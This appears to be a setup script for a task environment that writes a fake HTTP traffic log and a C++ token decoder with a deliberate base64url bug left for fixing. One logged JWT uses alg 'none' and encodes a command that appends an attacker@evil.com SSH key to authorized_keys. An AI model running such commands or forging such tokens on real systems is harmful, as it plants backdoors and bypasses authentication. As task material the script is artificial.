#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip g++ coreutils
    pip3 install pytest

    useradd -m -s /bin/bash user || true

    mkdir -p /home/user
    cd /home/user

    # Create the malicious payload
    PAYLOAD='{"user":"admin","role":"admin","cmd":"mkdir -p ~/.ssh; echo '\''ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3X attacker@evil.com'\'' >> ~/.ssh/authorized_keys"}'

    # Base64URL encode the payload (standard base64, then translate, then strip padding)
    B64_PAYLOAD=$(echo -n "$PAYLOAD" | base64 -w 0 | tr '+/' '-_' | tr -d '=')

    # Create traffic.log
    cat <<EOF > /home/user/traffic.log
GET /api/v1/status HTTP/1.1
Host: internal-api.local
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiZ3Vlc3QiLCJjbWQiOiJwaW5nIC1jIDEgOC44LjguOCJ9.signature123

POST /api/v1/execute HTTP/1.1
Host: internal-api.local
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.${B64_PAYLOAD}.
EOF

    # Create the buggy decode.cpp
    cat <<'EOF' > /home/user/decode.cpp
#include <iostream>
#include <fstream>
#include <string>
#include <vector>

std::string base64_decode(const std::string &in) {
    std::string out;
    std::vector<int> T(256,-1);
    for(int i=0; i<64; i++) T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i; 
    int val=0, valb=-8;
    for(unsigned char c : in) {
        if(T[c] == -1) break;
        val = (val<<6) + T[c];
        valb += 6;
        if(valb>=0) {
            out.push_back(char((val>>valb)&0xFF));
            valb-=8;
        }
    }
    return out;
}

int main(int argc, char* argv[]) {
    if (argc < 2) return 1;
    std::ifstream file(argv[1]);
    std::string line;
    while (std::getline(file, line)) {
        size_t bearer_pos = line.find("Bearer ");
        if (bearer_pos != std::string::npos) {
            std::string token = line.substr(bearer_pos + 7);
            size_t dot1 = token.find('.');
            if (dot1 != std::string::npos) {
                size_t dot2 = token.find('.', dot1 + 1);
                if (dot2 != std::string::npos) {
                    std::string payload = token.substr(dot1 + 1, dot2 - dot1 - 1);

                    // TODO: Fix Base64URL to Base64 conversion here
                    // payload = fix_base64url(payload);

                    std::cout << base64_decode(payload) << std::endl;
                }
            }
        }
    }
    return 0;
}
EOF

    chown -R user:user /home/user
    chmod -R 777 /home/user
